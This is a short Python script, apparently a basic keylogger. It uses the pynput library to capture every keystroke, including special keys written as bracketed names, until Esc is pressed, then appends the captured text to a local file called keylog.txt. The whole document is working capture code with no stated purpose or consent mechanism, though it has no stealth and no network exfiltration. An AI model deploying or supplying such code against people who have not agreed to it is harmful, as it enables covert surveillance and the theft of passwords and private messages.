from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

keystrokes = ""

def on_key_press(key):
    global keystrokes
    try:
        keystrokes += str(key.char)
    except AttributeError:
        if key == Key.space:
            keystrokes += " "
        elif key == Key.enter:
            keystrokes += "\n"
        else:
            keystrokes += f"[{key}]"

def on_key_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

with open(log_file, "a") as f:
    f.write(keystrokes)
